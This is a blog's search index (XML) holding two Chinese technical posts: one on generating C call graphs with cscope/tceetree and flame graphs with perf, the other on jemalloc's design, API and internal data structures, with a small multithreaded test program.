<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>生成程序call graph和flame graph（C语言）</title>
      <link href="/2022/02/21/Tceetree&amp;FlameGraph/"/>
      <url>/2022/02/21/Tceetree&amp;FlameGraph/</url>
      
        <content type="html"><![CDATA[<h1 id="调用图"><a href="#调用图" class="headerlink" title="调用图"></a>调用图</h1><p><a href="https://blog.csdn.net/qq_23599965/article/details/88815854">https://blog.csdn.net/qq_23599965/article/details/88815854</a></p><h2 id="tceetree步骤"><a href="#tceetree步骤" class="headerlink" title="tceetree步骤"></a>tceetree步骤</h2><p>参考：<a href="https://www.zhihu.com/question/59227720/answer/215384169">https://www.zhihu.com/question/59227720/answer/215384169</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装cscope graphviz</span></span><br><span class="line">sudo apt-get install cscope graphviz</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装tceetree</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/amboar/tceetree</span><br><span class="line"><span class="built_in">cd</span> tceetree-master</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"><span class="comment">#列出cscope需要分析的文件</span></span><br><span class="line">find . -name <span class="string">&quot;*.[c|h]&quot;</span> &gt; cscope.files</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成标签</span></span><br><span class="line">cscope -Rcbkq</span><br><span class="line"></span><br><span class="line"><span class="comment">#分析标签，生成dot</span></span><br><span class="line"><span class="comment">#在dot文件里删改，可以删掉不需要的分支和结点</span></span><br><span class="line">tceetree -f -o filename.dot  <span class="comment"># f选项带文件名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#生成图形 png svg pdf等，函数调用不建议png，放不下</span></span><br><span class="line">dot -Tpdf -O filename.dot -o filename.pdf</span><br></pre></td></tr></table></figure><p>生成的pdf文件如图所示，点击查看大图。</p><p><img src="https://img.lfalive.top/Tceetree&FlameGraph/cover.png"></p><h1 id="火焰图"><a href="#火焰图" class="headerlink" title="火焰图"></a>火焰图</h1><p><a href="https://github.com/brendangregg/FlameGraph">https://github.com/brendangregg/FlameGraph</a></p><p><a href="https://www.cnblogs.com/wx170119/p/11459995.html">https://www.cnblogs.com/wx170119/p/11459995.html</a></p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>以下操作权限不够记得sudo，还要先安装perf。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/brendangregg/FlameGraph</span><br><span class="line">perf record -F 90 -p 14490 -g <span class="comment"># -F表示每秒采样次数，-p表示的是进程号，-g表示记录调用栈</span></span><br><span class="line">perf script -i perf.data &amp;&gt; perf.unfold</span><br><span class="line">./FlameGraph/stackcollapse-perf.pl perf.unfold &amp;&gt; perf.folded              </span><br><span class="line">./FlameGraph/flamegraph.pl perf.folded &gt; perf.svg</span><br></pre></td></tr></table></figure><p>生成的svg文件如图所示，右键在新标签中打开图像，可以互动。</p><p><img src="https://img.lfalive.top/Tceetree&FlameGraph/perf.svg"></p>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> call graph </tag>
            
            <tag> flame graph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存分配器JeMalloc学习</title>
      <link href="/2022/02/15/JeMalloc/"/>
      <url>/2022/02/15/JeMalloc/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a href="http://jemalloc.net/">http://jemalloc.net/</a></p><p><a href="https://github.com/jemalloc/jemalloc">https://github.com/jemalloc/jemalloc</a></p><p>JeMalloc是一款内存分配器，与其它内存分配器相比，它最大的优势在于多线程情况下的高性能以及内存碎片的减少。</p><h1 id="论文（2006）"><a href="#论文（2006）" class="headerlink" title="论文（2006）"></a>论文（2006）</h1><p><a href="http://people.freebsd.org/~jasone/jemalloc/bsdcan2006/jemalloc.pdf">http://people.freebsd.org/~jasone/jemalloc/bsdcan2006/jemalloc.pdf</a></p><p>每个应用程序在运行时配置为具有固定数量的竞技场（Arena）。默认情况下，Arena的数量取决于处理器的数量：</p><ul><li>单处理器：所有分配使用一个Arena。使用多个Arena没有意义。</li><li>多处理器：使用四倍于处理器数量的Arena。通过将线程分配给一组Arena，单个Arena被同时使用的概率会降低。</li></ul><p>线程第一次分配或释放内存时，它被分配到一个Arena。Arena是以循环方式选择的，这样可以保证分配给Arena的线程数量大致相同。线程仍然可以在特定的Arena上相互竞争，但平均而言，不可能比循环分配做得更好。动态重新平衡可能会减少竞争，但必要的记录成本很高。</p><p>线程本地存储（TLS）对于有效实现Arena的循环分配非常重要，因为每个线程的Arena分配都需要存储在某个地方。</p><p>通过sbrk或mmap从内核请求的所有内存都以“块（chunk）”的大小的倍数进行管理，这样chunk的基址总是chunk大小的倍数。chunk的这种对齐方式允许对与分配相关联的chunk进行恒定时间的计算。默认情况下，chunk大小为2MB，chunk大小始终相同，并且从chunk对齐的地址开始。Arena将chunk分割进行更小的分配，但巨大的分配直接由一个或多个连续chunk支持。</p><p>分配的大小分为三大类：small、large和huge。所有分配请求均向上舍入到最近的大小类别边界。huge的分配的空间比chunk的一半还大，并由专用块直接支持。关于huge分配的元数据，存储在一棵红黑树中。由于大多数应用程序创建的huge分配很少（如果有的话），因此使用树不会出现可伸缩性问题。</p><p>对于small和large的分配，使用Binary Buddy算法将chunk分割成pages运行。关于运行状态的信息存储在每个chunk的开头，作为页面映射。large分配的空间大于pages的一半，但不大于块的一半。</p><p>小型分配分为三个子类别：tiny、quantum-spaced和sub-page。在实践中，大小为2的次幂的空间对于tiny的分配是有效的。量子大小通常为16字节。下图显示了所有分配大小的大小类。</p><p><img src="https://img.lfalive.top/JeMalloc/table.png"></p><p>如果取消quantum-spaced类，没有用于小型分配的子类，将更简单。然而，大多数应用程序主要分配小于512字节的对象，各类之间的量子间距大大减少了平均内部碎片。较多的大小类可能会导致外部碎片增加，但在实践中，减少的内部碎片通常会抵消增加的外部碎片。</p><p>small的分配是分开的，在每次运行开始时存储区域位图（BitMap），与其他方法相比，该方法有几个优点：</p><ul><li><p>位图可以快速扫描第一个空闲区域，这允许对正在使用的区域进行紧密打包。</p></li><li><p>分配器数据和应用程序数据是分开的。这降低了应用程序损坏分配器数据的可能性。这还可能增加应用程序数据的局部性，因为分配器数据不会与应用程序数据混合。</p></li><li><p>微小的区域很容易得到支持。</p></li></ul><p>为了限制外部碎片，除了最小类之外，所有类都使用多页运行。因此，对于最大的小型类（通常为2kb区域），外部碎片限制在大约3%。</p><p>在任何给定的时间内，每个尺寸类最多有一次“当前运行”。“当前运行”将保持当前状态，直到完全填满或完全清空。运行状态按照四分位数进行分类，QINIT类别的run永远不会被破坏。为了销毁某个运行，必须首先将其提升到更高的fullness等级。</p><img src="https://img.lfalive.top/JeMalloc/Q0.png" style="zoom:80%;" /><p>fullness类别还提供了一种从非完整运行中选择新“当前运行”的机制。偏好顺序是：Q50、Q25、Q0，然后是Q75。常规地这样选择会导致“当前运行”的快速切换。</p><p>对内存分配器进行详尽的基准测试是不可行的，基准测试结果在任何意义上都不应被解释为肯定的。分配器性能对应用程序分配模式非常敏感，基准测试者可以心血来潮，构建微基准，以有利或不利的角度显示本文测试的三个分配器中的任何一个。作者尽了一切努力避免这种结果的扭曲，但他的客观性不应该被我们读者所假定。基准测试应该足以让读者相信至少以下几点：</p><ul><li><p>jemalloc适用于在多处理器系统上运行的多线程程序。</p></li><li><p>在单线程程序上的运行时间和内存使用方面，jemalloc表现出与phkmalloc和dlmalloc相似的性能。</p></li></ul><p>事实上，jemalloc在所介绍的基准测试中表现得非常好，作者认为，没有任何理由怀疑jemalloc在除了精心制作的微基准测试之外的任何方面会比phkmalloc或dlmalloc表现得差得多。</p><p>这些基准测试都不是为测量内存压力下的性能而设计的。本文没有包括，主要是因为phkmalloc在内存压力下表现良好，而jemalloc使用了足够相似的算法，因此应该表现出相似的性能。碎片化很难分析，因为它主要是一个定性问题，标准工具只提供定量指标。</p><p>开发jemalloc时经常遇到的一个问题是，即使是看似无害的附加功能，例如维护每个Arena的总分配内存计数器，也会导致性能下降。分配器设计之初的特性比最终的多得多。</p><p>分配器的设计和实现的一部分吸引力在于，对于所有可能的分配模式，没有哪个分配器是优越的，所以在新软件引入新的分配模式时，总是需要进行微调。</p><h1 id="手册（jemalloc-5-2-1）"><a href="#手册（jemalloc-5-2-1）" class="headerlink" title="手册（jemalloc 5.2.1）"></a>手册（jemalloc 5.2.1）</h1><h2 id="Standard-API"><a href="#Standard-API" class="headerlink" title="Standard API"></a>Standard API</h2><p><code>void *malloc(size_t size)</code>;</p><p>分配大小为<code>size</code>字节的未初始化内存。分配的空间被适当地对齐，以便于存储任何类型的对象。</p><p><code>void *calloc(size_t number, size_t size)</code>;</p><p>为<code>number</code>个对象分配空间，每个对象的长度为<code>size</code>字节。结果与使用<code>number*size</code>参数调用<code>malloc()</code>相同，只是分配的内存被显式初始化为0字节。</p><p><code>int posix_memalign(void **ptr, size_t alignment, size_t size)</code>;</p><p>分配<code>size</code>字节的内存，使分配的基址是<code>alignment</code>的倍数，并以<code>ptr</code>指向的值返回分配。请求的<code>alignment</code>必须是2的幂，至少与<code>sizeof(void *)</code>大小相同。</p><p><code>void *aligned_alloc(size_t alignment, size_t size)</code>;</p><p>分配<code>size</code>字节的内存，使分配的基址是<code>alignment</code>的倍数。请求的<code>alignment</code>必须是2的幂。如果<code>size</code>不是<code>alignment</code>的整数倍，则行为未定义。</p><p><code>void *realloc(void *ptr, size_t size)</code>;</p><p>函数将<code>ptr</code>引用的先前分配内存的大小更改为<code>size</code>字节。内存的内容在新旧大小中以较小者为准。如果新大小更大，则新分配的内存部分的内容未定义。成功后，<code>ptr</code>引用的内存将被释放，并返回指向新分配内存的指针。请注意，<code>realloc()</code>可能会移动内存分配，从而产生与<code>ptr</code>不同的返回值。如果<code>ptr</code>为NULL，<code>realloc()</code>函数在指定大小下的行为与<code>malloc()</code>相同。</p><p><code>void free(void *ptr)</code>;</p><p>使<code>ptr</code>引用的已分配内存可用于将来的分配。如果<code>ptr</code>为NULL，则不会发生任何操作。</p><h2 id="Non-standard-API"><a href="#Non-standard-API" class="headerlink" title="Non-standard API"></a>Non-standard API</h2><p><code>void *mallocx(size_t size, int flags)</code>;</p><p>分配至少<code>size</code>字节的内存，并返回一个指向分配基址的指针。如果大小为0，则行为未定义。</p><p><code>void *rallocx(void *ptr, size_t size, int flags)</code>;</p><p>将<code>ptr</code>处的分配调整为至少<code>size</code>字节，并返回一个指向最终分配的基址的指针，该地址可能已从其原始位置移动，也可能未从其原始位置移动。如果大小为0，则行为未定义。</p><p><code>size_t xallocx(void *ptr, size_t size, size_t extra, int flags)</code>;</p><p>将<code>ptr</code>处的分配调整为至少<code>size</code>字节，并返回分配的实际大小。如果<code>extra</code>为非零，则会尝试调整为至少<code>size + extra</code>字节，且无法分配额外字节并不会导致分配失败。如果<code>size</code>为0，或者<code>size + extra &gt; SIZE_T_MAX</code>，则行为未定义。</p><p><code>size_t sallocx(void *ptr, int flags)</code>;</p><p>返回<code>ptr</code>处分配的实际大小。</p><p><code>void dallocx(void *ptr, int flags)</code>;</p><p>使<code>ptr</code>引用的内存可用于将来的分配。</p><p><code>void sdallocx(void *ptr, size_t size, int flags)</code>;</p><p><code>sdallocx()</code>函数是<code>dallocx()</code>的一个扩展，带有一个size参数，允许调用方传递分配大小。最小有效输入大小是分配的原始请求大小，最大有效输入大小是<code>nallocx()</code>或<code>sallocx()</code>返回的相应值。</p><p><code>size_t nallocx(size_t size, int flags)</code>;</p><p><code>nallocx()</code>函数不分配内存，但它执行与<code>mallocx()</code>函数相同的大小计算，并返回等效<code>mallocx()</code>函数调用产生的分配的实际大小，如果输入超过支持的最大大小类或对齐，则返回0。如果大小为0，则行为未定义。</p><p>以上<code>mallocx()</code> ,<code> rallocx()</code> ,<code>xallocx()</code> ,<code> sallocx</code>() ,<code>dallocx()</code> ,<code> sdallocx()</code>，和<code>nallocx()</code>都有<code>flags</code>可用于指定选项的参数。使用位或(<code> |</code>)指定一个或多个参数：</p><ul><li><p><code>MALLOCX_LG_ALIGN(la)</code></p><p>对齐内存分配，使其从一个地址开始，该地址是<code>(1 &lt;&lt; la)</code>的倍数。此宏不验证<code>la</code>在有效范围内。</p></li><li><p><code>MALLOCX_ALIGN(a)</code></p><p>对齐内存分配，使其从一个地址开始，该地址是<code>a</code>的倍数，其中<code>a</code>是2的幂。此宏不验证<code>a</code>是2的幂。</p></li><li><p><code>MALLOCX_ZERO</code></p><p>初始化新分配的内存以包含0字节。在不断增长的重新分配情况下，重新分配之前的实际大小定义了未接触字节和初始化为包含0字节的字节之间的边界。如果此宏不存在，则新分配的内存将取消初始化。</p></li><li><p><code>MALLOCX_TCACHE(tc)</code></p><p>使用标识符<code>tc</code>指定特定线程缓存(tcache)。此宏不验证<code>tc</code>指定的标识符有效。</p></li><li><p><code>MALLOCX_TCACHE_NONE</code></p><p>不要使用特定线程缓存(tcache)。除非使用了<code>MALLOCX_TCACHE(tc)</code>，不然在许多情况下将使用自动管理的tcache。此宏不能作为参数与<code>MALLOCX_TCACHE(tc)</code>用于同一个<code>flags</code>。</p></li><li><p><code>MALLOCX_ARENA(a)</code></p><p>使用索引<code>a</code>指定的Arena。此宏对指定Arena以外的Arena分配区域无效。此宏不验证索引<code>a</code>指定的Arena在有效范围内。</p></li></ul><p><code>int mallctl(const char *name, void *oldp, size_t *oldlenp, void *newp, size_t newlen)</code>;</p><p><code>mallctl()</code>函数提供了一个通用接口，设置可修改的参数和触发操作。<code>name</code>参数指定树结构命名空间中的位置。要读取一个值，通过<code>oldp</code>传递一个指针，该指针所指向空间有足够的空间来容纳该值，并通过<code>oldlenp</code>传递一个指向其长度的指针；否则传递<code>NULL</code>和<code>NULL</code>。同样，要写一个值，通过<code>newp</code>传递一个指向该值的指针，并通过<code>newlen</code>传递其长度；否则传递<code>NULL</code>和<code>0</code>。</p><p><code>int mallctlnametomib(const char *name, size_t *mibp, size_t *miblenp)</code>;</p><p><code>int mallctlbymib(const size_t *mib, size_t miblen, void *oldp, size_t *oldlenp, void *newp, size_t newlen)</code>;</p><p><code>mallctlnametomib()</code>提供了一种方法，将<code>name</code>转换为“管理信息库”（MIB），可以重复传递给<code>mallctlbymib()</code>，避免重复查询命名空间相同部分。从<code>mallctlnametomib()</code>成功返回后，<code>mibps</code>是一个包含<code>*miblenp</code>个整数的数组，其中<code>*miblenp</code>是<code>name</code>中的组件数和<code>*miblenp</code>的输入值中的较小者。因此，可以传递小于组件数量的<code>*miblenp</code>，这会产生一个部分MIB，可以用作构建完整MIB的基础。因此，构建如下代码是合理的：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> nbins, i;</span><br><span class="line"><span class="type">size_t</span> mib[<span class="number">4</span>];</span><br><span class="line"><span class="type">size_t</span> len, miblen;</span><br><span class="line">len = <span class="keyword">sizeof</span>(nbins);</span><br><span class="line">mallctl(<span class="string">&quot;arenas.nbins&quot;</span>, &amp;nbins, &amp;len, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">miblen = <span class="number">4</span>;</span><br><span class="line">mallctlnametomib(<span class="string">&quot;arenas.bin.0.size&quot;</span>, mib, &amp;miblen);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nbins; i++) &#123;</span><br><span class="line"><span class="type">size_t</span> bin_size;</span><br><span class="line">mib[<span class="number">2</span>] = i;</span><br><span class="line">len = <span class="keyword">sizeof</span>(bin_size);</span><br><span class="line">mallctlbymib(mib, miblen, (<span class="type">void</span> *)&amp;bin_size, &amp;len, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/* Do something with bin_size... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>void malloc_stats_print(void(*write_cb)(void *, const char *), void *cbopaque, const char *opts)</code>;</p><p>写入摘要统计信息。统计数据以人类可读的形式呈现，除非<code>opts</code>字符串中指定了“J”字符，在这种情况下，统计数据以JSON格式呈现。此函数可以重复调用。通过在<code>opts</code>字符串中指定“g”作为字符，可以忽略在执行过程中从不更改的一般信息。请注意，<code>malloc_stats_print()</code>在内部使用<code>mallctl*()</code>函数，因此如果多个线程同时使用这些函数，则可能会报告不一致的统计信息。如果配置过程中指定了<code>--enable stats</code>参数，则可以指定定“m”、“d”和“a”来分别忽略合并的Arena、销毁合并的Arena和打印每个Arena的统计信息；可以指定“b”和“l”来分别忽略bins和large对象的每大小类别统计信息；可以指定“x”来省略所有互斥统计信息；“e”可用于省略范围统计信息。无法识别的字符将被默默忽略。请注意，线程缓存可能会阻止某些统计信息完全更新，因为合并跟踪线程缓存操作的计数器时需要额外的锁。</p><h1 id="源码（5-2-1）"><a href="#源码（5-2-1）" class="headerlink" title="源码（5.2.1）"></a>源码（5.2.1）</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.dbplayer.org/jemalloc-note/">https://blog.dbplayer.org/jemalloc-note/</a></p><p><a href="https://uncp.github.io/JeMalloc/">https://uncp.github.io/JeMalloc/</a></p><h2 id="重要特性"><a href="#重要特性" class="headerlink" title="重要特性"></a>重要特性</h2><ol><li>chunk这一概念被替换成了extent</li><li>dirty page的decay变成了两阶段，dirty -&gt; muzzy -&gt; retained（基于衰变的清理）</li><li>huge class这一概念不再存在</li><li>红黑树不再使用，取而代之的是pairing heap</li></ol><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="extent"><a href="#extent" class="headerlink" title="extent"></a>extent</h3><p>头文件<code>include/jemalloc/internal/extent*.h</code>，jemalloc核心数据结构，内存操作单位。</p><p>管理jemalloc内存块的结构（即分配给用户的虚拟内存块），每一个内存块大小可以是<code>N * page_size (N &gt;= 1)</code>。一个extent可以用来分配一次large_class的内存申请，但可以用来分配多次small_class的内存申请，如果分配的是small_class，这时的extent也称作slab。</p><ul><li><code>extent.e_bits</code>：8字节长，记录<code>arena_ind</code>、<code>zeroed</code>、<code>state</code>、<code>nfree</code>等信息</li><li><code>extent.e_addr</code>：管理的内存块的起始地址</li><li><code>extent.e_slab_data</code>：当此<code>extent</code>用于分配small_class内存时，用来记录这个extent的分配情况，此时每个extent的内的小内存称为region</li></ul><p><code>extent.e_bits</code>中记录的state有四种情况。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">extent_state_active   = <span class="number">0</span>,</span><br><span class="line">extent_state_dirty    = <span class="number">1</span>,</span><br><span class="line">extent_state_muzzy    = <span class="number">2</span>,</span><br><span class="line">extent_state_retained = <span class="number">3</span></span><br><span class="line">&#125; <span class="type">extent_state_t</span>;</span><br></pre></td></tr></table></figure><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>头文件<code>include/jemalloc/internal/arena_*.h</code>，arena是extent的管理者。</p><p>用于分配&amp;回收extent的结构，在文件<code>arena_structs_b.h</code>中定义它的数据结构。默认使用四倍于逻辑CPU数量的arena来减少锁的竞争，各个arena所管理的内存相互独立，多个arena之间的内存是不可见的。每个用户线程会被绑定到一个arena上，它的所有内存申请释放行为都会被jemalloc转换为对此 arena 的操作。</p><ul><li><code>arena.large</code>：存放large_class的extent</li><li><code>arena.bins[SC_NBINS]</code>：heap，存放空闲region</li><li><code>arena.extents_dirty</code>：存放用户调用<code>free</code>或<code>tcache</code>回收后的extent</li><li><code>arena.extents_muzzy</code>：存放<code>extents_dirty</code>进行lazy purge后的extent，dirty -&gt; muzzy</li><li><code>arena.extents_retained</code>：存放<code>extents_muzzy</code>进行<code>decommit</code>或force purge后的extent，muzzy -&gt; retained</li><li><code>arena.extent_avail</code>：存放可用的extent</li><li><code>arena.base</code>：指向该arena的元数据base</li></ul><p>arena中释放的extend标记了多种状态，清理过程被称为decay-based purging（基于衰变的清理）。</p><p>释放的extent如果曾被使用过，会有对应的物理内存分配，就认为是dirty的，如果一个固定周期内没被再使用，就移动到muzzy列表。如果一个固定周期内没被再使用会被purge，会转到retained列表中。retained里的就是完全用不到的extent了，直接释放掉留个统计数就好了。</p><p>当线程寻找一个合适的arena进行绑定时，会遍历arenas数组，并顺序挑选。</p><ol><li>如果找到当前线程绑定数为0的arena, 则优先使用它。</li><li>如果当前已初始化arena中没有线程绑定数为0的，则优先使用剩余空的数组位置<br>构造一个新的arena。arenas数组遵循lazy create原则，初始状态整个arenas数组只有0号是被初始化的，其他位置都是null指针。通常随着新的线程不断创造出来，arenas数组也被逐渐填满。</li><li>如果前两条都不满足，则选择当前绑定线程数最小的，且位置更靠前的一个arena进行绑定。</li></ol><h3 id="size-class"><a href="#size-class" class="headerlink" title="size class"></a>size class</h3><p>头文件<code>include/jemalloc/internal/sc.h</code>。</p><p>假设在64位系统上，页面大小为4 KiB，量子大小为16 bytes，每个类别中的大小类如表所示。</p><p><img src="https://img.lfalive.top/JeMalloc/table5.2.1.png"></p><p>共有232个小类。如果用户申请的大小位于两个小类之间，会取较大的。比如申请14字节，位于8和16字节之间，按16字节分配，分为2大类：</p><ol><li><code>small_class</code>（小内存）：对于64位机器来说，通常区间是<code>[8, 14KiB]</code>。为了减少内存碎片，并不都是2的幂。</li><li><code>large_class</code>（大内存）：对于64位机器来说，通常区间是<code>[16KiB, 7EiB]</code>，从<code>4 * page_size</code>开始，最大是<code>2^62 + 3^60</code>。</li></ol><ul><li><code>sc.index</code>：size位于<code>size_class</code>中的索引号，区间为 [0，231]。例如4kb字节为28。</li></ul><h3 id="base"><a href="#base" class="headerlink" title="base"></a>base</h3><p>头文件<code>include/jemalloc/internal/base_*.h</code>。</p><p>arena的元数据，所有base组成一个链表。</p><h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>头文件<code>include/jemalloc/internal/bin*.h</code>，管理slab。</p><p>bin是一组slab类型的extent。</p><h3 id="slab"><a href="#slab" class="headerlink" title="slab"></a>slab</h3><p>当extent用于分配small_class内存时，称其为slab。一个extent可以被用来处理多个同一size_class的内存申请。</p><h2 id="其他头文件"><a href="#其他头文件" class="headerlink" title="其他头文件"></a>其他头文件</h2><h3 id="jemalloc"><a href="#jemalloc" class="headerlink" title="jemalloc"></a>jemalloc</h3><p>头文件<code>include/jemalloc/internal/jemalloc*.h</code>，jemalloc 核心接口。</p><h3 id="atomic"><a href="#atomic" class="headerlink" title="atomic"></a>atomic</h3><p>头文件<code>include/jemalloc/internal/atomic*.h</code>，移植了C11中的<code>atomic</code>操作。</p><p>包括<code>acquire</code>等基本操作和<code>bool</code>、<code>size_t</code>、<code>unsigned</code>等一些基本类型的原子类型。</p><h3 id="background-thread"><a href="#background-thread" class="headerlink" title="background_thread"></a>background_thread</h3><p>头文件<code>include/jemalloc/internal/background_thread_*.h</code>，后台线程。</p><p>后台线程用于内存的自动回收，可以主动的启停。</p><h3 id="tsd"><a href="#tsd" class="headerlink" title="tsd"></a>tsd</h3><p>头文件<code>include/jemalloc/internal/tsd*.h</code>，Thread-Specific-Data，每个线程独有，用于存放与这个线程相关的结构。</p><ul><li><code>tsd.rtree_ctx</code>：当前线程的rtree context，用于快速访问extent信息</li><li><code>tsd.arena</code>：当前线程绑定的<code>arena</code></li><li><code>tsd.tcache</code>：当前线程的<code>tcache</code></li></ul><h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><p>头文件<code>include/jemalloc/internal/tcache*.h</code>，tcache是每个线程独有的缓存（Thread Cache），大多数内存申请都可以在tcache中直接得到，避免加锁。</p><ul><li><code>tcache.bins_small[SC_NBINS]</code>：小内存的cache_bin</li></ul><h3 id="cache-bin"><a href="#cache-bin" class="headerlink" title="cache_bin"></a>cache_bin</h3><p>头文件<code>include/jemalloc/internal/cache_bin.h</code>，每个线程独有的，专用于分配小内存的缓存。</p><ul><li><code> cache_bin.low_water</code>：上一次GC后剩余的缓存数量</li><li><code>cache_bin.ncached</code>：当前cache_bin存放的缓存数量</li><li><code>cache_bin.avail</code>：可直接用于分配的内存</li></ul><h3 id="pages"><a href="#pages" class="headerlink" title="pages"></a>pages</h3><p>头文件<code>include/jemalloc/internal/pages.h</code>，内存页的操作。</p><h2 id="工具函数"><a href="#工具函数" class="headerlink" title="工具函数"></a>工具函数</h2><p>均在 <code>include/jemalloc/internal/</code> 目录下</p><ul><li><code>assert.h</code>，自定义断言，减少断言失败后死锁的可能性</li><li><code>bit_util.h</code>，位操作</li><li><code>ctl.h</code>，控制函数入口</li><li><code>emitter.h</code>，用于输出</li><li><code>log.h</code>，日志输出</li><li><code>hook.h</code>，定义 extent 的 hook 方法（非常实验性的API，可能会被删除）</li><li><code>mutex*.h</code>，锁实现</li><li><code>nstime.h</code>，时间相关函数</li><li><code>prof*.h</code>，性能分析相关实现</li><li><code>quantum.h</code>，定义用于对齐的宏 <code>LG_QUANTUM</code></li><li><code>safety_check.h</code>，安全性检查相关</li><li><code>stats.h</code>，状态统计和打印相关</li><li><code>sz.h</code>，内存大小计算和转换相关</li><li><code>test_hooks.h</code>，用于测试对libc的hook效果</li><li><code>ticker.h</code>，时间ticker类</li><li><code>util.h</code>，各种工具函数</li><li><code>witness.h</code>，死锁监控</li></ul><h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><p>均在 <code>include/jemalloc/internal/</code> 目录下</p><ul><li><code>bitmap.h</code></li><li><code>ckh.h</code>，Cuckoo Hash</li><li><code>hash.h</code>，基于<a href="https://github.com/aappleby/smhasher">MurmurHash3</a></li><li><code>div.h</code>，比CPU除法更快的实现</li><li><code>ph.h</code>，<a href="https://www.cs.cmu.edu/~sleator/papers/pairing-heaps.pdf">Pairing Heap</a>实现。配对堆是一种多叉树，并且可以被认为是一种简化的斐波那契堆。（From wikipedia）</li><li><code>prng.h</code>，线性同余伪随机数生成器</li><li><code>rb.h</code>，实现left-leaning 2-3 red-black tree</li><li><code>rtree*.h</code>，实现Radix Tree，专门为将元数据与jemalloc当前拥有的extent关联起来而定制的。</li><li><code>seq.h</code>，顺序锁（seqlock）实现</li><li><code>smoothsteps.h</code>，实现S函数曲线（<a href="https://en.wikipedia.org/wiki/Smoothstep">sigmoidal curve</a>）的回收图像，将一个回收周期拆分为200步</li><li><code>spin.h</code>，自旋等待</li></ul><h2 id="其他设计"><a href="#其他设计" class="headerlink" title="其他设计"></a>其他设计</h2><p>见<a href="https://uncp.github.io/JeMalloc">参考链接</a>，基于5.1.0版本，结合5.2.0版本的<a href="https://github.com/jemalloc/jemalloc/releases/tag/5.2.0">ChangeLog</a>看。</p><h1 id="博客（2011）和视频（2015）"><a href="#博客（2011）和视频（2015）" class="headerlink" title="博客（2011）和视频（2015）"></a>博客（2011）和视频（2015）</h1><p><a href="https://engineering.fb.com/2011/01/03/core-data/scalable-memory-allocation-using-jemalloc/">博客链接</a></p><p><a href="https://www.youtube.com/watch?v=RcWp5vwGlYU">视频链接</a></p><h1 id="安装测试"><a href="#安装测试" class="headerlink" title="安装测试"></a>安装测试</h1><p>下载最新source code压缩包解压。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> jemalloc-5.2.1</span><br><span class="line">./autogen.sh</span><br><span class="line">make -j 6</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>安装成功后编写测试代码testjemalloc.c：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jemalloc/jemalloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_THREAD 16</span></span><br><span class="line"><span class="type">pthread_t</span> threads[MAX_THREAD];</span><br><span class="line"><span class="type">char</span> *opt;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_something</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">50000</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">20000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_THREAD; i++) &#123;</span><br><span class="line">pthread_create(&amp;threads[i], <span class="literal">NULL</span>, (<span class="type">void</span> *) &amp;do_something, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">opt = <span class="string">&quot;gbxem&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_THREAD; i++) &#123; pthread_join(threads[i], <span class="literal">NULL</span>); &#125;</span><br><span class="line">malloc_stats_print(<span class="literal">NULL</span>, <span class="literal">NULL</span>, opt);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>gcc testjemalloc.c -o testjemalloc -ljemalloc -lpthread</code>编译，然后将jemalloc安装目录下的lib路径追加到文件&#x2F;etc&#x2F;ld.so.conf，再执行<code>ldconfig</code>，就可以正常运行测试程序了。</p><p>以上代码创建16个线程，每个线程分配大小分别为50000和20000的内存块（都是large），并输出分配统计。</p><p><img 